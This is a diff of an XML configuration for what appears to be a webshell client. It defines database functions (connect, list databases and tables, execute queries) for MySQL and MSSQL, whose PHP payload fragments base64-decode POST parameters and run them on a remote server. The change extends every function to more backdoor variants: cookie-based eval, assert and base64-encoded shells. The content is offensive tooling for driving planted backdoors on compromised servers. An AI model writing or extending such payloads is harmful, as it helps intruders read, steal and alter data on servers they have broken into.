@@ -3,7 +3,7 @@
   <funcCodeSetting>
     <func>
       <name>ConnectDb</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
       <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
@@ -14,7 +14,7 @@ print($T?"1":"0");
     </func>
     <func>
       <name>GetDbName</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
       <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
@@ -29,7 +29,7 @@ while($rs=@mysql_fetch_row($q))
     </func>
 	<func>
       <name>GetTableName</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -46,7 +46,7 @@ while($rs=@mysql_fetch_row($q))
     </func>
 	<func>
       <name>GetColumnType</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -65,7 +65,7 @@ while($rs=@mysql_fetch_row($q))
     </func>
 	<func>
       <name>ExecuteReader</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -97,7 +97,7 @@ while($rs=@mysql_fetch_row($q))
     </func>
 	<func>
       <name>ExecuteNonQuery</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mysql</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -118,7 +118,7 @@ print("\t|\t\r\n");
 	
 	<func>
       <name>ConnectDb</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mssql_sqlsrv</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
       <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
@@ -135,7 +135,7 @@ if($conn){
     </func>
 	<func>
       <name>GetDbName</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mssql_sqlsrv</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
       <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
@@ -160,7 +160,7 @@ if(!$conn){
     </func>
 	<func>
       <name>GetTableName</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mssql_sqlsrv</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -187,7 +187,7 @@ if(!$conn){
     </func>
 	<func>
       <name>GetColumnType</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mssql_sqlsrv</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -216,7 +216,7 @@ if(!$conn){
     </func>
 	<func>
       <name>ExecuteReader</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mssql_sqlsrv</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
@@ -255,7 +255,7 @@ if(!$conn){
     </func>
 	<func>
       <name>ExecuteNonQuery</name>
-	  <type>phpEval</type>
+	  <type>phpEval,phpEval_Cookie,phpAssert,phpEval_Base64,phpAssert_Base64</type>
 	  <path>/DbManager/mssql_sqlsrv</path>
 	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
